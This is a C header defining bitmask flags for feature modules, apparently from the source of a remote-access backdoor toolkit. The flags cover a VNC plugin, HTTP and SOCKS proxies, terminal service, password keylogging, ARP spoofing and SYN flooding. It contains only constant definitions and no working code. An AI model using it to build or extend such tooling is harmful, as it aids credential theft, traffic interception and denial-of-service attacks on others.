#if !defined _zxfunmask

#define _zxfunmask

#define CAPDEVICE	1
#define VNCPLUGIN	2
#define ZXPLUGIN	4
#define ZXHTTPSRV	8
#define ZXHTTPPROXY	0x10
#define ZXSOCKPROXY	0x20
#define TERMSERVICE	0x40
#define KEYLOGPASSWORD	0x80
#define MASK_ZXARPSPOOF	0x100
#define MASK_SYNFLOOD	0x200

#endif